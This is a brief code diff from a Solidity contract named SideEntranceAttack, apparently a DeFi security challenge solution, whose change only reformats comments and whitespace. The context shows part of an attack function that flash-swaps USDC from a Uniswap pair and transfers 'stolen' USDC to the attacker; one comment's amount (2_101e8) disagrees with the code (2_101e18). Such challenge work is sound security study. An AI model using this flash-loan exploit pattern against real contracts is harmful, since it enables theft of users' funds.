@@ -35,9 +35,9 @@ contract SideEntranceAttack {
 
     function attack() public {
         // flash USDC from USDC-DAI
-            // we want to flash the usdcStrike (2100e18) of the already created option
-            // we flash 2_101e8 - because Uniswap burns 1000 when totalSupply = 0
-        usdcDaiPair.swap({amount0Out: 2_101e18, amount1Out: 0, to: address(this), data: "flash"}); 
+        // we want to flash the usdcStrike (2100e18) of the already created option
+        // we flash 2_101e8 - because Uniswap burns 1000 when totalSupply = 0
+        usdcDaiPair.swap({amount0Out: 2_101e18, amount1Out: 0, to: address(this), data: "flash"});
 
         // transfer all USDC stolen to attacker
         uint256 attackerAmount = usdc.balanceOf(address(this));
